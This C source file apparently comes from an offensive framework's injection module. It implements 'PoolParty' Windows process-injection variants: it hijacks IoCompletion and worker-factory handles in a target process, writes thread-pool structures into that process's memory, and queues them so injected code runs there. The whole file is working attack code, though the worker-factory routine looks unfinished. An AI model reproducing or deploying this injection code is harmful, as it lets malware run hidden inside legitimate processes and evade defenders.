#include "common.h"
#include "pool_party.h"
#include "pool_party_ext.h"

pNtDll *ntdll = NULL;
BOOL bSupportedTechnique[POOLPARTY_TECHNIQUE_COUNT] = { 0 };

pNtDll* GetOrInitNtDll() {
	BOOL bError = FALSE;
	HANDLE hHeap = GetProcessHeap();
	bError = (hHeap == NULL);

	if (ntdll != NULL) {
		return ntdll;
	}

	if (!bError) {
		ntdll = (pNtDll*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(pNtDll));
		bError = ntdll == NULL;
		if (!bError) {
			HMODULE hNtDll = LoadLibraryA("ntdll.dll");

			// Hijack Handles, we always have this ( hopefully :/ )
			ntdll->pNtQueryInformationProcess = (NTSTATUS(NTAPI*)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG))GetProcAddress(hNtDll, "NtQueryInformationProcess");
			ntdll->pNtQueryObject = (NTSTATUS(NTAPI*)(HANDLE, OBJECT_INFORMATION_CLASS, PVOID, ULONG, PULONG))GetProcAddress(hNtDll, "NtQueryObject");
			dprintf("[INJECT][inject_via_poolparty][ntdll_init] NtQueryInformationProcess: %p NtQueryObject: %p", ntdll->pNtQueryInformationProcess, ntdll->pNtQueryObject);
			// Remote TP Wait Insertion: WIN11, WIN10(?)
			ntdll->pZwAssociateWaitCompletionPacket = (NTSTATUS(NTAPI*)(HANDLE, HANDLE, HANDLE, PVOID, PVOID, NTSTATUS, ULONG_PTR, PBOOLEAN))GetProcAddress(hNtDll, "ZwAssociateWaitCompletionPacket");
			if (ntdll->pZwAssociateWaitCompletionPacket != NULL) {
				bSupportedTechnique[POOLPARTY_TECHNIQUE_TP_WAIT_INSERTION] = TRUE;
			}
			dprintf("[INJECT][inject_via_poolparty][ntdll_init] ZwAssociateWaitCompletionPacket: %p", ntdll->pZwAssociateWaitCompletionPacket);

			// Remote TP Direct Insertion: WIN11 WIN10(?) WIN7
			ntdll->pZwSetIoCompletion = (NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, NTSTATUS, ULONG_PTR))GetProcAddress(hNtDll, "ZwSetIoCompletion");
			if (ntdll->pZwSetIoCompletion != NULL) {
				bSupportedTechnique[POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION] = TRUE;
			}
			dprintf("[INJECT][inject_via_poolparty][ntdll_init] ZwSetIoCompletion: %p", ntdll->pZwSetIoCompletion);


			ntdll->pNtQueryInformationWorkerFactory = (NTSTATUS(NTAPI*)(HANDLE, _WORKERFACTORYINFOCLASS, PVOID, ULONG, PULONG))GetProcAddress(hNtDll, "NtQueryInformationWorkerFactory"); // WIN 7
			dprintf("[INJECT][inject_via_poolparty][ntdll_init] NtQueryInformationWorkerFactory: %p", ntdll->pNtQueryInformationWorkerFactory);

			ntdll->pNtSetInformationWorkerFactory = (NTSTATUS(NTAPI*)(HANDLE, _WORKERFACTORYINFOCLASS, PVOID, ULONG))GetProcAddress(hNtDll, "NtSetInformationWorkerFactory"); // WIN7
			dprintf("[INJECT][inject_via_poolparty][ntdll_init] NtSetInformationWorkerFactory: %p", ntdll->pNtSetInformationWorkerFactory);

			if (ntdll->pNtQueryInformationWorkerFactory != NULL && ntdll->pNtSetInformationWorkerFactory != NULL) {
				bSupportedTechnique[POOLPARTY_TECHNIQUE_WORKER_FACTORY_OVERWRITE] = TRUE;
			}


			//ntdll->pZwSetInformationFile = (NTSTATUS(NTAPI*)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, ULONG))GetProcAddress(hNtDll, "ZwSetInformationFile"); // WIN7
			//ntdll->pNtAlpcCreatePort = (NTSTATUS(NTAPI*)(PHANDLE, POBJECT_ATTRIBUTES, PALPC_PORT_ATTRIBUTES))GetProcAddress(hNtDll, "NtAlpcCreatePort"); // WIN7
			//ntdll->pNtAlpcSetInformation = (NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG))GetProcAddress(hNtDll, "NtAlpcSetInformation"); // WIN7
			//ntdll->pNtAlpcConnectPort = (NTSTATUS(NTAPI*)(PHANDLE, PUNICODE_STRING, POBJECT_ATTRIBUTES, PALPC_PORT_ATTRIBUTES, DWORD, PSID, PPORT_MESSAGE, PSIZE_T, PALPC_MESSAGE_ATTRIBUTES, PALPC_MESSAGE_ATTRIBUTES, PLARGE_INTEGER))GetProcAddress(hNtDll, "NtAlpcConnectPort"); // WIN7
			//ntdll->pRtlAdjustPrivilege = (NTSTATUS(NTAPI*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN))GetProcAddress(hNtDll, "RtlAdjustPrivilege"); // WIN7
			//ntdll->pNtSetTimer2 = (NTSTATUS(NTAPI*)(HANDLE, PLARGE_INTEGER, PLARGE_INTEGER, PT2_SET_PARAMETERS))GetProcAddress(hNtDll, "NtSetTimer2"); // WIN 10(?)
			//ntdll->pNtTpAllocAlpcCompletion = (NTSTATUS(NTAPI*)(PVOID, HANDLE, PVOID, PVOID, PVOID))GetProcAddress(hNtDll, "TpAllocAlpcCompletion"); // WIN7
			//ntdll->pTpAllocJobNotification = (NTSTATUS(NTAPI*)(PVOID, HANDLE, PVOID, PVOID, PVOID))GetProcAddress(hNtDll, "TpAllocJobNotification"); // WIN 10
		}
	}
	return ntdll;
}


HANDLE GetRemoteHandle(HANDLE hProcess, LPCWSTR typeName, DWORD dwDesiredAccess) {
	HANDLE hHijackHandle = INVALID_HANDLE_VALUE;
	ULONG dwInformationSizeIn = 2048;
	ULONG dwInformationSizeOut = 0;
	HANDLE hCurrProcess = GetCurrentProcess();
	HANDLE hHeap = GetProcessHeap();
	PPROCESS_HANDLE_SNAPSHOT_INFORMATION lpProcessInfo = NULL;
	PPUBLIC_OBJECT_TYPE_INFORMATION lpObjectInfo = NULL;
	pNtDll* ntDll = GetOrInitNtDll();

	DWORD ntStatus = 0;
	lpProcessInfo = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwInformationSizeIn);
	dprintf("[INJECT][inject_via_poolparty][get_remote_handle] lpProcessInfo: %p", lpProcessInfo);

	while (TRUE) {
		ntStatus = ntdll->pNtQueryInformationProcess(hProcess, ProcessHandleInformation, lpProcessInfo, dwInformationSizeIn, &dwInformationSizeOut);
		dprintf("[INJECT][inject_via_poolparty][get_remote_handle] NtQueryInformationProcess() : %p", ntStatus);
		if (ntStatus == 0xC0000004L && dwInformationSizeIn != dwInformationSizeOut) {
			lpProcessInfo = HeapReAlloc(hHeap, 0, lpProcessInfo, dwInformationSizeOut);
			dprintf("[INJECT][inject_via_poolparty][get_remote_handle] HeapReAlloc lpProcessInfo: %p", lpProcessInfo);
			dwInformationSizeIn = dwInformationSizeOut;
			continue;
		}
		if (ntStatus != 0 && ntStatus != 0xC0000004L) {
			HeapFree(hHeap, 0, lpProcessInfo);
			return INVALID_HANDLE_VALUE;
		}
		if (ntStatus == 0) {
			break;
		}
	}
	dprintf("[INJECT][inject_via_poolparty][get_remote_handle] lpProcessInfo: %p dwInformationSizeIn: %d", lpProcessInfo, dwInformationSizeIn);
	dwInformationSizeIn = 2048;
	dwInformationSizeOut = 0;
	lpObjectInfo = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwInformationSizeIn);
	dprintf("[INJECT][inject_via_poolparty][get_remote_handle] lpObjectInfo: %p", lpObjectInfo);
	for (ULONG i = 0; i < lpProcessInfo->NumberOfHandles; i++) {
		if (DuplicateHandle(hProcess, lpProcessInfo->Handles[i].HandleValue, hCurrProcess, &hHijackHandle, dwDesiredAccess, FALSE, 0)) {
			ntDll->pNtQueryObject(hHijackHandle, ObjectTypeInformation, lpObjectInfo, dwInformationSizeIn, &dwInformationSizeOut);
			if (dwInformationSizeIn > dwInformationSizeOut) {
				if (lstrcmpW(typeName, lpObjectInfo->TypeName.Buffer) == 0) {
					break;
				}
			}
			CloseHandle(hHijackHandle);
		}
		hHijackHandle = INVALID_HANDLE_VALUE;
	}
	HeapFree(hHeap, 0, lpObjectInfo);
	HeapFree(hHeap, 0, lpProcessInfo);
	dprintf("[INJECT][inject_via_poolparty][get_remote_handle] hHijackHandle: %p", hHijackHandle);
	return hHijackHandle;
}

DWORD remote_tp_wait_insertion(HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE *hTriggerHandle) {
	BOOL bError = FALSE;
	HANDLE hHijackHandle = INVALID_HANDLE_VALUE;
	ULONG dwInformationSizeIn = 1;
	ULONG dwInformationSizeOut = 0;
	pNtDll* ntDll = NULL;
	DWORD dwResult = ERROR_POOLPARTY_GENERIC;
	HANDLE hHeap = GetProcessHeap();

	do {
		ntDll = GetOrInitNtDll();
		if (ntdll == NULL) {
			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_wait_insertion] Cannot init GetOrInitNtDll()", ERROR_POOLPARTY_GENERIC);
		}
		if (!bSupportedTechnique[POOLPARTY_TECHNIQUE_TP_WAIT_INSERTION]) {
			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_wait_insertion] This variant is not supported in this system.", ERROR_POOLPARTY_VARIANT_FAILED)
		}
		hHijackHandle = GetRemoteHandle(hProcess, L"IoCompletion", IO_COMPLETION_ALL_ACCESS);

		if (hHijackHandle == INVALID_HANDLE_VALUE) {
			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_wait_insertion] Unable to locate IoCompletion object inside the target process.", ERROR_POOLPARTY_VARIANT_FAILED)
		}

		if (hHijackHandle != INVALID_HANDLE_VALUE) {
			PFULL_TP_WAIT hThreadPool = (PFULL_TP_WAIT)CreateThreadpoolWait((PTP_WAIT_CALLBACK)(lpStartAddress), lpParameter, NULL);
			PFULL_TP_WAIT pRemoteTpWait = VirtualAllocEx(hProcess, NULL, sizeof(FULL_TP_WAIT) + sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
			PTP_DIRECT pRemoteTpDirect = (PTP_DIRECT)(pRemoteTpWait + sizeof(FULL_TP_WAIT));

			WriteProcessMemory(hProcess, pRemoteTpWait, hThreadPool, sizeof(FULL_TP_WAIT), NULL);
			WriteProcessMemory(hProcess, pRemoteTpDirect, &hThreadPool->Direct, sizeof(TP_DIRECT), NULL);
			ntDll->pZwAssociateWaitCompletionPacket(hThreadPool->WaitPkt, hHijackHandle, *hTriggerHandle, pRemoteTpDirect, pRemoteTpWait, 0, 0, NULL);
			dwResult = 0;
		}
	} while (0);
	return dwResult;
}

DWORD remote_tp_direct_insertion(HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE* hTrigger) {
	BOOL bError = FALSE;
	HANDLE hHijackHandle = INVALID_HANDLE_VALUE;
	ULONG dwInformationSizeIn = 1;
	ULONG dwInformationSizeOut = 0;
	pNtDll* ntDll = NULL;
	DWORD dwResult = ERROR_POOLPARTY_GENERIC;
	HANDLE hHeap = GetProcessHeap();
	dwDestinationArch = PROCESS_ARCH_X64;
	DWORD dwDirectSize = dwDestinationArch == PROCESS_ARCH_X64 ? TP_DIRECT_STRUCT_SIZE_X64 : TP_DIRECT_STRUCT_SIZE_X86;

	WOW64_CONTEXT test = { 0 };
	LPVOID *Direct = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwDirectSize);
	do {
		ntDll = GetOrInitNtDll();
		dprintf("%d fs offset: %p", sizeof(WOW64_CONTEXT), (QWORD)&test.SegFs - (QWORD)&test);
		if (ntdll == NULL) {
			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Cannot GetOrInitNtDll()", ERROR_POOLPARTY_GENERIC);
		}
		if (!bSupportedTechnique[POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION]) {
			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] This variant is not supported in this system.", ERROR_POOLPARTY_VARIANT_FAILED)
		}
		hHijackHandle = GetRemoteHandle(hProcess, L"IoCompletion", IO_COMPLETION_ALL_ACCESS);

		if (hHijackHandle == INVALID_HANDLE_VALUE) {
			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Unable to locate IoCompletion object inside the target process.", ERROR_POOLPARTY_VARIANT_FAILED)
		}

		if (hHijackHandle != INVALID_HANDLE_VALUE) {

			if (dwDestinationArch == PROCESS_ARCH_X64) {
				*(QWORD*)((BYTE*)Direct + TP_DIRECT_STRUCT_CB_OFFSET_X64) = (QWORD) lpStartAddress;
			}
			if (dwDestinationArch == PROCESS_ARCH_X86) {
				*(DWORD*)((BYTE*)Direct + TP_DIRECT_STRUCT_CB_OFFSET_X86) = (DWORD)((QWORD)lpStartAddress);
			}
			LPVOID RemoteDirectAddress = VirtualAllocEx(hProcess, NULL, dwDirectSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
			if (!RemoteDirectAddress) {
				BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Unable to allocate RemoteDirectAddress.", ERROR_POOLPARTY_VARIANT_FAILED)
			}
			if (!WriteProcessMemory(hProcess, RemoteDirectAddress, Direct, dwDirectSize, NULL)) {
				BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Unable to write target process memory.", ERROR_POOLPARTY_VARIANT_FAILED)
			}
			ntDll->pZwSetIoCompletion(hHijackHandle, RemoteDirectAddress, lpParameter, 0, 0);
			dwResult = 0;
		}
	} while (0);
	return dwResult;
}

DWORD worker_factory_start_routine_overwrite(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE* hTrigger) {
	BOOL bError = FALSE;
	HANDLE hHijackHandle = INVALID_HANDLE_VALUE;
	ULONG dwInformationSizeIn = 1;
	ULONG dwInformationSizeOut = 0;
	pNtDll* ntDll = NULL;
	DWORD dwResult = ERROR_POOLPARTY_GENERIC;
	HANDLE hHeap = GetProcessHeap();
	WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = { 0 };
	do {
		ntDll = GetOrInitNtDll();
		if (ntdll == NULL) {
			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] Cannot GetOrInitNtDll()", ERROR_POOLPARTY_GENERIC);
		}
		if (!bSupportedTechnique[POOLPARTY_TECHNIQUE_WORKER_FACTORY_OVERWRITE]) {
			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] This variant is not supported in this system.", ERROR_POOLPARTY_VARIANT_FAILED)
		}
		hHijackHandle = GetRemoteHandle(hProcess, L"TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS);

		if (hHijackHandle == INVALID_HANDLE_VALUE) {
			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] Unable to locate IoCompletion object inside the target process.", ERROR_POOLPARTY_VARIANT_FAILED)
		}

		if (hHijackHandle != INVALID_HANDLE_VALUE) {
			ntdll->pNtQueryInformationWorkerFactory(hHijackHandle, WorkerFactoryBasicInformation, &WorkerFactoryInformation, sizeof(WorkerFactoryInformation), NULL);

			ULONG WorkerFactoryMinimumThreadNumber = WorkerFactoryInformation.TotalWorkerCount + 1;
			dprintf("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] WorkerFactoryInformation.StartRoutine: %ull", WorkerFactoryInformation.StartRoutine);
			ntdll->pNtSetInformationWorkerFactory(hHijackHandle, WorkerFactoryThreadMinimum, &WorkerFactoryMinimumThreadNumber, sizeof(ULONG));
		}
	} while (0);
	return dwResult;
}